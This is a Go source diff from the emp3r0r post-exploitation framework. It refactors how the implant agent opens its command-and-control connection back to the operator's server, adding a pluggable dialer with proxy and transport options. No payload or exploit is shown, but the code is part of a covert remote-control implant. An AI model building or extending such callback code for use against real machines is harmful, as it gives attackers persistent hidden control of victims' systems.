@@ -4,14 +4,13 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"net/http"
-	"strings"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/pkg/agenttransport"
 )
 
 // EstablishC2Connection connects to C2 using the configured wrapper mode.
@@ -29,22 +28,18 @@ func EstablishC2Connection(url, streamID, route string) (conn io.ReadWriteCloser
 	if mode == "" {
 		mode = def.C2ChannelModeDefault
 	}
-	channelWrapper, resolveErr := transport.GetC2ChannelWrapper(mode)
+	dialer, resolveErr := agenttransport.Get(mode)
 	if resolveErr != nil {
-		available := strings.Join(transport.AllC2ChannelModes(), ",")
 		cancel()
-		return nil, nil, nil, fmt.Errorf("unsupported c2 channel mode %q (available: %s)", mode, available)
-	}
-	if mode == def.C2ChannelModePlainHTTP {
-		if w, ok := channelWrapper.(*transport.HTTPChannelWrapper); ok {
-			w.Config = &common.RuntimeConfig.MalleableC2
-			w.PollInterval = common.RuntimeConfig.PollInterval
-			w.Jitter = common.RuntimeConfig.Jitter
-		}
+		return nil, nil, nil, resolveErr
 	}
 	logging.Infof("EstablishC2Connection: connecting to %s with mode=%s", url, mode)
 
-	rw, err := establishChannelStream(ctx, url, channelWrapper)
+	rw, err := establishChannelStream(ctx, dialer, agenttransport.Target{
+		Address: url,
+		Proxy:   common.RuntimeConfig.C2TransportProxy,
+		Options: common.RuntimeConfig.TransportOptions,
+	})
 	if err != nil {
 		cancel()
 		return nil, nil, nil, err
@@ -92,26 +87,21 @@ func isBootstrapRoute(route string) bool {
 	return route == routes.Checkin || route == routes.Msg
 }
 
-func establishChannelStream(ctx context.Context, url string, channelWrapper transport.C2ChannelWrapper) (io.ReadWriteCloser, error) {
+func establishChannelStream(ctx context.Context, dialer agenttransport.Dialer, target agenttransport.Target) (io.ReadWriteCloser, error) {
 	type connectResult struct {
 		stream io.ReadWriteCloser
-		resp   *http.Response
 		err    error
 	}
 	resultChan := make(chan connectResult, 1)
 	go func() {
-		stream, r, e := channelWrapper.Dial(ctx, def.HTTPClient, url)
-		resultChan <- connectResult{stream: stream, resp: r, err: e}
+		stream, e := dialer.Dial(ctx, target)
+		resultChan <- connectResult{stream: stream, err: e}
 	}()
 
 	select {
 	case res := <-resultChan:
 		if res.err != nil {
 			return nil, fmt.Errorf("initiate channel stream: %w", res.err)
-		}
-		if res.resp != nil && res.resp.StatusCode != http.StatusOK {
-			_ = res.stream.Close()
-			return nil, fmt.Errorf("bad status code: %d", res.resp.StatusCode)
 		}
 		return res.stream, nil
 	case <-time.After(10 * time.Second):
